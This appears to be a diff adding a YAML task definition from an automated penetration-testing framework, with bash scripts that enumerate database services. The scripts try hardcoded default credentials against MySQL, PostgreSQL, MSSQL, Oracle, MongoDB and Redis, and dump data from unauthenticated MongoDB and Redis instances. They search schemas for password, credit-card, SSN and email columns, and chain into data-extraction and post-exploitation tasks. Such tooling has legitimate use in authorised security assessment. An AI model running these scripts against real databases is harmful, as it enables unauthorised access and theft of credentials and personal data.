@@ -1,0 +1,568 @@
+id: database_enumeration
+name: Database Service Enumeration and Exploitation
+category: Database Security
+priority: critical
+description: Comprehensive database enumeration including version detection, credential testing, and data extraction
+detailed_description: |
+  Perform comprehensive database enumeration across multiple database types including MySQL,
+  PostgreSQL, MSSQL, Oracle, MongoDB, and Redis. Includes credential testing, schema enumeration,
+  and sensitive data discovery.
+
+# Asset property-based triggers
+asset_triggers:
+  - asset_type: service
+    conditions:
+      all:
+        - property: category
+          operator: equals
+          value: "database"
+        - property: state
+          operator: equals
+          value: "open"
+        - property: database_enumerated
+          operator: not_equals
+          value: true
+    priority: 95
+    deduplication_key: "{asset.id}:db_enum"
+    batch_capable: true
+    batch_criteria: database_type
+
+  - asset_type: service
+    conditions:
+      all:
+        - property: service_name
+          operator: in_list
+          values: ["mysql", "postgresql", "mssql", "oracle", "mongodb", "redis"]
+        - property: valid_credentials
+          operator: exists
+        - property: database_post_auth_enum
+          operator: not_equals
+          value: true
+    priority: 98
+    deduplication_key: "{asset.id}:db_auth_enum:{credentials.hash}"
+
+  - asset_type: service
+    conditions:
+      all:
+        - property: category
+          operator: equals
+          value: "nosql"
+        - property: auth_required
+          operator: equals
+          value: false
+        - property: nosql_enumerated
+          operator: not_equals
+          value: true
+    priority: 92
+    deduplication_key: "{asset.id}:nosql_enum"
+
+# Variable extraction
+variables:
+  target_host:
+    source: host_id
+    transform: "getHostProperty(host_id, 'ip_address')"
+
+  target_port:
+    source: port
+
+  database_type:
+    source: service_name
+    transform: |
+      switch(service_name) {
+        case 'mysql': return 'mysql'
+        case 'postgresql': return 'postgres'
+        case 'mssql': return 'mssql'
+        case 'oracle': return 'oracle'
+        case 'mongodb': return 'mongodb'
+        case 'redis': return 'redis'
+        default: return 'unknown'
+      }
+
+  available_credentials:
+    source: valid_credentials
+    default: []
+
+  database_services:
+    source: parent_asset
+    transform: "parent_asset.properties.database_services"
+    default: []
+
+  output_dir:
+    value: "/tmp/db_enum_{asset.id}_{timestamp}"
+
+# Batch command for multiple database services
+batch_command: |
+  #!/bin/bash
+  OUTPUT_DIR="{output_dir}"
+  DB_TYPE="{database_type}"
+
+  mkdir -p "$OUTPUT_DIR"
+
+  echo "[*] Starting database enumeration at $(date)" | tee "$OUTPUT_DIR/db_enum.log"
+
+  # Create database services list
+  cat > "$OUTPUT_DIR/db_services.txt" << 'EOF'
+  {database_services}
+  EOF
+
+  # Phase 1: Database Service Discovery and Version Detection
+  echo "[+] Phase 1: Database Service Discovery" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+  while read -r service_info; do
+    host=$(echo "$service_info" | cut -d: -f1)
+    port=$(echo "$service_info" | cut -d: -f2)
+    db_type=$(echo "$service_info" | cut -d: -f3)
+
+    echo "  [*] Enumerating $db_type on $host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+    # Nmap database scripts
+    echo "    [+] Nmap database enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+    nmap -p "$port" --script "($db_type* or ssl*) and not brute" \
+      "$host" > "$OUTPUT_DIR/nmap_${db_type}_${host}_${port}.txt" 2>&1
+
+    # Banner grabbing
+    echo "    [+] Banner grabbing..." | tee -a "$OUTPUT_DIR/db_enum.log"
+    timeout 10 nc -v "$host" "$port" < /dev/null > "$OUTPUT_DIR/banner_${db_type}_${host}_${port}.txt" 2>&1
+
+    # Database-specific enumeration
+    case "$db_type" in
+      mysql)
+        echo "    [+] MySQL enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Version detection
+        nmap -p "$port" --script mysql-info "$host" > "$OUTPUT_DIR/mysql_info_${host}_${port}.txt" 2>&1
+
+        # Test for anonymous access
+        timeout 10 mysql -h "$host" -P "$port" -e "SELECT VERSION();" > "$OUTPUT_DIR/mysql_anon_${host}_${port}.txt" 2>&1
+
+        # Test common credentials
+        for cred in "root:" "root:root" "root:toor" "root:mysql" "mysql:mysql" "admin:admin"; do
+          user=$(echo "$cred" | cut -d: -f1)
+          pass=$(echo "$cred" | cut -d: -f2)
+
+          echo "      [*] Testing MySQL credential: $user" | tee -a "$OUTPUT_DIR/db_enum.log"
+          timeout 10 mysql -h "$host" -P "$port" -u "$user" -p"$pass" \
+            -e "SELECT VERSION(); SHOW DATABASES;" > "$OUTPUT_DIR/mysql_cred_${host}_${port}_${user}.txt" 2>&1
+
+          if grep -q "Database\|information_schema" "$OUTPUT_DIR/mysql_cred_${host}_${port}_${user}.txt"; then
+            echo "        [+] SUCCESS: MySQL $user:$pass@$host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+            echo "$user:$pass" >> "$OUTPUT_DIR/mysql_valid_creds_${host}_${port}.txt"
+          fi
+        done
+        ;;
+
+      postgresql)
+        echo "    [+] PostgreSQL enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Test for trust authentication
+        timeout 10 psql -h "$host" -p "$port" -U postgres -c "SELECT version();" \
+          > "$OUTPUT_DIR/postgres_trust_${host}_${port}.txt" 2>&1
+
+        # Test common credentials
+        for cred in "postgres:postgres" "postgres:password" "postgres:" "admin:admin"; do
+          user=$(echo "$cred" | cut -d: -f1)
+          pass=$(echo "$cred" | cut -d: -f2)
+
+          echo "      [*] Testing PostgreSQL credential: $user" | tee -a "$OUTPUT_DIR/db_enum.log"
+          PGPASSWORD="$pass" timeout 10 psql -h "$host" -p "$port" -U "$user" \
+            -c "SELECT version(); \l" > "$OUTPUT_DIR/postgres_cred_${host}_${port}_${user}.txt" 2>&1
+
+          if grep -q "PostgreSQL\|List of databases" "$OUTPUT_DIR/postgres_cred_${host}_${port}_${user}.txt"; then
+            echo "        [+] SUCCESS: PostgreSQL $user:$pass@$host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+            echo "$user:$pass" >> "$OUTPUT_DIR/postgres_valid_creds_${host}_${port}.txt"
+          fi
+        done
+        ;;
+
+      mssql)
+        echo "    [+] MSSQL enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Test for blank SA password
+        timeout 15 sqsh -S "$host:$port" -U sa -P "" \
+          -C "SELECT @@version" > "$OUTPUT_DIR/mssql_blank_sa_${host}_${port}.txt" 2>&1
+
+        # Test common credentials
+        for cred in "sa:" "sa:sa" "sa:password" "sa:Password123" "admin:admin"; do
+          user=$(echo "$cred" | cut -d: -f1)
+          pass=$(echo "$cred" | cut -d: -f2)
+
+          echo "      [*] Testing MSSQL credential: $user" | tee -a "$OUTPUT_DIR/db_enum.log"
+          timeout 15 sqsh -S "$host:$port" -U "$user" -P "$pass" \
+            -C "SELECT @@version; SELECT name FROM sys.databases;" \
+            > "$OUTPUT_DIR/mssql_cred_${host}_${port}_${user}.txt" 2>&1
+
+          if grep -q "Microsoft SQL Server\|master\|tempdb" "$OUTPUT_DIR/mssql_cred_${host}_${port}_${user}.txt"; then
+            echo "        [+] SUCCESS: MSSQL $user:$pass@$host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+            echo "$user:$pass" >> "$OUTPUT_DIR/mssql_valid_creds_${host}_${port}.txt"
+          fi
+        done
+
+        # Test for MSSQL service enumeration
+        nmap -p "$port" --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell \
+          "$host" > "$OUTPUT_DIR/mssql_vuln_${host}_${port}.txt" 2>&1
+        ;;
+
+      oracle)
+        echo "    [+] Oracle enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Oracle TNS enumeration
+        nmap -p "$port" --script oracle-tns-version,oracle-sid-brute \
+          "$host" > "$OUTPUT_DIR/oracle_tns_${host}_${port}.txt" 2>&1
+
+        # Test common Oracle credentials
+        for cred in "system:oracle" "sys:sys" "scott:tiger" "admin:admin"; do
+          user=$(echo "$cred" | cut -d: -f1)
+          pass=$(echo "$cred" | cut -d: -f2)
+
+          echo "      [*] Testing Oracle credential: $user" | tee -a "$OUTPUT_DIR/db_enum.log"
+          # Oracle connection requires proper client setup - use basic test
+          timeout 15 sqlplus "$user/$pass@$host:$port/XE" \
+            @<(echo "SELECT * FROM v\$version;") > "$OUTPUT_DIR/oracle_cred_${host}_${port}_${user}.txt" 2>&1
+        done
+        ;;
+
+      mongodb)
+        echo "    [+] MongoDB enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Test for unauthenticated access
+        timeout 10 mongo --host "$host:$port" --eval "db.version(); show dbs;" \
+          > "$OUTPUT_DIR/mongodb_unauth_${host}_${port}.txt" 2>&1
+
+        if grep -q "admin\|local\|test" "$OUTPUT_DIR/mongodb_unauth_${host}_${port}.txt"; then
+          echo "        [!] CRITICAL: MongoDB with no authentication at $host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+          # Enumerate collections
+          mongo --host "$host:$port" --eval "
+            var dbs = db.adminCommand('listDatabases').databases;
+            dbs.forEach(function(database) {
+              print('Database: ' + database.name);
+              db = db.getSiblingDB(database.name);
+              db.getCollectionNames().forEach(function(collection) {
+                print('  Collection: ' + collection);
+                print('  Sample docs: ' + db[collection].find().limit(2).toArray());
+              });
+            });
+          " > "$OUTPUT_DIR/mongodb_enum_${host}_${port}.txt" 2>&1
+        fi
+
+        # Test authentication if configured
+        for cred in "admin:admin" "root:root" "mongodb:mongodb"; do
+          user=$(echo "$cred" | cut -d: -f1)
+          pass=$(echo "$cred" | cut -d: -f2)
+
+          timeout 10 mongo --host "$host:$port" -u "$user" -p "$pass" \
+            --eval "db.version(); show dbs;" > "$OUTPUT_DIR/mongodb_cred_${host}_${port}_${user}.txt" 2>&1
+        done
+        ;;
+
+      redis)
+        echo "    [+] Redis enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        # Test for unauthenticated access
+        timeout 10 redis-cli -h "$host" -p "$port" INFO \
+          > "$OUTPUT_DIR/redis_info_${host}_${port}.txt" 2>&1
+
+        if grep -q "redis_version" "$OUTPUT_DIR/redis_info_${host}_${port}.txt"; then
+          echo "        [!] CRITICAL: Redis with no authentication at $host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+          # Enumerate keys
+          redis-cli -h "$host" -p "$port" --scan --pattern "*" | head -100 \
+            > "$OUTPUT_DIR/redis_keys_${host}_${port}.txt" 2>&1
+
+          # Get configuration
+          redis-cli -h "$host" -p "$port" CONFIG GET "*" \
+            > "$OUTPUT_DIR/redis_config_${host}_${port}.txt" 2>&1
+
+          # Check for dangerous commands
+          redis-cli -h "$host" -p "$port" EVAL "return 'LUA_ENABLED'" 0 \
+            > "$OUTPUT_DIR/redis_lua_${host}_${port}.txt" 2>&1
+        fi
+
+        # Test authentication
+        for password in "password" "redis" "admin" "123456"; do
+          timeout 10 redis-cli -h "$host" -p "$port" -a "$password" INFO \
+            > "$OUTPUT_DIR/redis_auth_${host}_${port}_${password}.txt" 2>&1
+
+          if grep -q "redis_version" "$OUTPUT_DIR/redis_auth_${host}_${port}_${password}.txt"; then
+            echo "        [+] SUCCESS: Redis password '$password' at $host:$port" | tee -a "$OUTPUT_DIR/db_enum.log"
+          fi
+        done
+        ;;
+    esac
+
+  done < "$OUTPUT_DIR/db_services.txt"
+
+  # Phase 2: Authenticated Database Enumeration
+  echo "[+] Phase 2: Authenticated Database Enumeration" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+  if [ -n "{available_credentials}" ]; then
+    IFS=',' read -ra CREDS <<< "{available_credentials}"
+    for cred in "${CREDS[@]}"; do
+      username=$(echo "$cred" | cut -d':' -f1)
+      password=$(echo "$cred" | cut -d':' -f2)
+
+      while read -r service_info; do
+        host=$(echo "$service_info" | cut -d: -f1)
+        port=$(echo "$service_info" | cut -d: -f2)
+        db_type=$(echo "$service_info" | cut -d: -f3)
+
+        echo "  [*] Authenticated enumeration of $db_type on $host:$port with $username" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+        case "$db_type" in
+          mysql)
+            echo "    [+] MySQL schema enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+            timeout 30 mysql -h "$host" -P "$port" -u "$username" -p"$password" << 'MYSQL_ENUM_EOF'
+SELECT VERSION();
+SHOW DATABASES;
+SELECT schema_name FROM information_schema.schemata;
+SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') LIMIT 50;
+SELECT DISTINCT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%pass%' OR column_name LIKE '%pwd%' LIMIT 20;
+SELECT user, host FROM mysql.user;
+SHOW GRANTS;
+MYSQL_ENUM_EOF
+            > "$OUTPUT_DIR/mysql_schema_${host}_${port}_${username}.txt" 2>&1
+            ;;
+
+          postgresql)
+            echo "    [+] PostgreSQL schema enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+            PGPASSWORD="$password" timeout 30 psql -h "$host" -p "$port" -U "$username" << 'POSTGRES_ENUM_EOF'
+SELECT version();
+\l
+\dt
+SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('information_schema','pg_catalog') LIMIT 50;
+SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%pass%' LIMIT 20;
+SELECT usename FROM pg_user;
+\dp
+POSTGRES_ENUM_EOF
+            > "$OUTPUT_DIR/postgres_schema_${host}_${port}_${username}.txt" 2>&1
+            ;;
+
+          mssql)
+            echo "    [+] MSSQL schema enumeration..." | tee -a "$OUTPUT_DIR/db_enum.log"
+            timeout 30 sqsh -S "$host:$port" -U "$username" -P "$password" << 'MSSQL_ENUM_EOF'
+SELECT @@version
+SELECT name FROM sys.databases
+SELECT name FROM sysobjects WHERE xtype='U'
+SELECT t.name as table_name, c.name as column_name FROM sys.tables t INNER JOIN sys.columns c ON t.object_id = c.object_id WHERE c.name LIKE '%password%' OR c.name LIKE '%pass%'
+SELECT name, loginname FROM sysusers
+go
+MSSQL_ENUM_EOF
+            > "$OUTPUT_DIR/mssql_schema_${host}_${port}_${username}.txt" 2>&1
+            ;;
+        esac
+
+      done < "$OUTPUT_DIR/db_services.txt"
+    done
+  fi
+
+  # Phase 3: Sensitive Data Discovery
+  echo "[+] Phase 3: Sensitive Data Discovery" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+  # Search for potential sensitive data in enumerated schemas
+  find "$OUTPUT_DIR" -name "*_schema_*.txt" -exec grep -l -i "user\|password\|credit\|ssn\|email\|admin" {} \; | \
+  while read -r schema_file; do
+    echo "  [+] Potential sensitive data in: $(basename "$schema_file")" | tee -a "$OUTPUT_DIR/db_enum.log"
+    grep -i "user\|password\|credit\|ssn\|email\|admin" "$schema_file" >> "$OUTPUT_DIR/sensitive_data_findings.txt"
+  done
+
+  echo "[*] Database enumeration completed at $(date)" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+  # Generate summary
+  echo "[+] Generating database enumeration summary..." | tee -a "$OUTPUT_DIR/db_enum.log"
+  cat > "$OUTPUT_DIR/SUMMARY.txt" << 'SUMMARY_EOF'
+=== DATABASE ENUMERATION SUMMARY ===
+
+DATABASE SERVICES FOUND:
+$(wc -l < "$OUTPUT_DIR/db_services.txt" || echo "0") database services enumerated
+
+AUTHENTICATION BYPASS:
+$(grep -c "no authentication" "$OUTPUT_DIR/db_enum.log" || echo "0") databases with no authentication
+$(grep -c "blank password" "$OUTPUT_DIR/db_enum.log" || echo "0") databases with blank passwords
+
+SUCCESSFUL AUTHENTICATIONS:
+$(cat "$OUTPUT_DIR"/*_valid_creds_*.txt 2>/dev/null | wc -l || echo "0") successful credential authentications
+
+SENSITIVE DATA INDICATORS:
+$(cat "$OUTPUT_DIR/sensitive_data_findings.txt" 2>/dev/null | wc -l || echo "0") potential sensitive data references found
+
+CRITICAL FINDINGS:
+$(grep -c "CRITICAL" "$OUTPUT_DIR/db_enum.log" || echo "0") critical security issues identified
+
+DATABASE TYPES:
+MySQL: $(ls "$OUTPUT_DIR"/mysql_* 2>/dev/null | wc -l || echo "0") instances
+PostgreSQL: $(ls "$OUTPUT_DIR"/postgres_* 2>/dev/null | wc -l || echo "0") instances
+MSSQL: $(ls "$OUTPUT_DIR"/mssql_* 2>/dev/null | wc -l || echo "0") instances
+MongoDB: $(ls "$OUTPUT_DIR"/mongodb_* 2>/dev/null | wc -l || echo "0") instances
+Redis: $(ls "$OUTPUT_DIR"/redis_* 2>/dev/null | wc -l || echo "0") instances
+
+RECOMMENDATION:
+$(if [ $(grep -c "CRITICAL" "$OUTPUT_DIR/db_enum.log" || echo "0") -gt 0 ]; then echo "CRITICAL: Unsecured databases found - immediate remediation required"; else echo "Review database access controls and authentication mechanisms"; fi)
+SUMMARY_EOF
+
+  echo "[*] Results saved to: $OUTPUT_DIR" | tee -a "$OUTPUT_DIR/db_enum.log"
+
+# Individual command for single database service
+individual_command: |
+  #!/bin/bash
+  HOST="{target_host}"
+  PORT="{target_port}"
+  DB_TYPE="{database_type}"
+  OUTPUT_DIR="{output_dir}"
+
+  mkdir -p "$OUTPUT_DIR"
+
+  echo "[*] Database enumeration of $DB_TYPE on $HOST:$PORT at $(date)" | tee "$OUTPUT_DIR/db_single.log"
+
+  # Basic enumeration
+  echo "[+] Basic database enumeration..."
+  nmap -p "$PORT" --script "($DB_TYPE* or ssl*) and not brute" "$HOST" > "$OUTPUT_DIR/nmap.txt" 2>&1
+
+  # Database-specific enumeration
+  case "$DB_TYPE" in
+    mysql)
+      timeout 10 mysql -h "$HOST" -P "$PORT" -e "SELECT VERSION();" > "$OUTPUT_DIR/version.txt" 2>&1
+      ;;
+    postgresql)
+      timeout 10 psql -h "$HOST" -p "$PORT" -U postgres -c "SELECT version();" > "$OUTPUT_DIR/version.txt" 2>&1
+      ;;
+    mongodb)
+      timeout 10 mongo --host "$HOST:$PORT" --eval "db.version();" > "$OUTPUT_DIR/version.txt" 2>&1
+      ;;
+    redis)
+      timeout 10 redis-cli -h "$HOST" -p "$PORT" INFO > "$OUTPUT_DIR/info.txt" 2>&1
+      ;;
+  esac
+
+  # Authenticated enumeration if credentials available
+  if [ -n "{available_credentials}" ]; then
+    echo "[+] Authenticated enumeration..."
+    cred="{available_credentials}"
+    username=$(echo "$cred" | cut -d':' -f1)
+    password=$(echo "$cred" | cut -d':' -f2)
+
+    case "$DB_TYPE" in
+      mysql)
+        mysql -h "$HOST" -P "$PORT" -u "$username" -p"$password" \
+          -e "SHOW DATABASES; SELECT user FROM mysql.user;" > "$OUTPUT_DIR/auth_enum.txt" 2>&1
+        ;;
+      postgresql)
+        PGPASSWORD="$password" psql -h "$HOST" -p "$PORT" -U "$username" \
+          -c "\l; SELECT usename FROM pg_user;" > "$OUTPUT_DIR/auth_enum.txt" 2>&1
+        ;;
+    esac
+  fi
+
+# Expected property updates
+property_updates:
+  on_success:
+    - property: database_enumerated
+      operation: set
+      value: true
+
+    - property: database_version
+      operation: set
+      value: "{detected_version}"
+
+    - property: database_schemas
+      operation: set
+      value: "{discovered_schemas}"
+
+    - property: database_users
+      operation: set
+      value: "{discovered_users}"
+
+    - property: authentication_bypass
+      operation: set
+      value: "{auth_bypass_possible}"
+
+    - property: sensitive_data_indicators
+      operation: set
+      value: "{sensitive_data_found}"
+
+    - property: database_post_auth_enum
+      operation: set
+      value: true
+      condition: credentials_used
+
+# Expected discoveries
+expected_discoveries:
+  - asset_type: vulnerability
+    conditions:
+      - severity: ["critical", "high"]
+    properties:
+      name: "{vulnerability_name}"
+      severity: "{severity}"
+      affected_service: "database"
+      auth_bypass: "{auth_bypass}"
+
+  - asset_type: credential
+    conditions:
+      - discovered_via: "default_creds"
+    properties:
+      username: "{username}"
+      password: "{password}"
+      service: "database"
+      database_type: "{database_type}"
+
+  - asset_type: data_store
+    conditions:
+      - contains_sensitive_data: true
+    properties:
+      database_name: "{database_name}"
+      table_name: "{table_name}"
+      data_types: "{sensitive_data_types}"
+      access_level: "{access_level}"
+
+# Chain triggers
+chain_triggers:
+  on_success:
+    - condition:
+        property: authentication_bypass
+        operator: equals
+        value: true
+      trigger: database_exploitation
+
+    - condition:
+        property: valid_credentials
+        operator: exists
+      trigger: database_post_exploitation
+
+    - condition:
+        property: sensitive_data_indicators
+        operator: greater_than
+        value: 0
+      trigger: data_extraction
+
+    - condition:
+        property: database_type
+        operator: equals
+        value: "mongodb"
+      trigger: nosql_injection_testing
+
+# Outcome analysis
+outcome_analysis:
+  success_indicators:
+    - Database service responding
+    - Version information obtained
+    - Schema enumeration successful
+    - Authentication bypass found
+
+  failure_indicators:
+    - Service not responding
+    - All authentication failed
+    - No schema access
+    - Connection timeouts
+
+# Cleanup
+cleanup:
+  - priority: medium
+    action: Close database connections
+    command: |
+      # Kill any hanging database connections
+      pkill -f "mysql.*{target_host}"
+      pkill -f "psql.*{target_host}"
+      pkill -f "mongo.*{target_host}"
+
+  - priority: low
+    action: Remove temporary files
+    command: rm -rf {output_dir}
